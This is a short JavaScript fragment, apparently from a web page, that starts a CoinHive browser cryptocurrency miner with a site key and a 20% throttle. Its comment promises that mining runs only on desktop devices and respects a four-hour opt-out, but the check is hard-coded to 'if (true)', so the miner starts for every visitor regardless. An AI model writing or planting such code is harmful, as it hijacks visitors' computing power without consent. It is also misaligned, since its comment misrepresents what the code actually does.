var miner = new CoinHive.Anonymous('k5JbEESOrA1kfL8f8Ab9VQPSDvAmvuXF', {
    throttle: 0.2
}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (true) {miner.start();}